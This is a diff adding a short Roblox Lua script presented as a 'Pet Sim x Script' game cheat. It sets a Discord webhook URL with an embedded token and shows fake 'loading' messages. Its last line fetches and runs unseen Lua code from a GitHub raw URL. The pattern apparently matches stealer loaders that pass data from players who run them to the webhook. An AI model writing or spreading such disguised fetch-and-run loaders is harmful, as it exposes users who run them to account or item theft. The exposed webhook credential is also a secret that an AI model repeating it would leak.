@@ -1,0 +1,9 @@
+WebHook = "https://discord.com/api/webhooks/1117846422348365925/Oqlt02jqGSl6hOSZS3C-d6h7o10j1hzeox6CbPUohM5bq6AxfY9nJ4lzRBp3FtV8Tkiv"
+loadingscreen = true
+_G.Key = "Odkdbfbfj"
+_G.CustomScriptName = "Pet Sim x Script"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script-v4-1.lua"))()
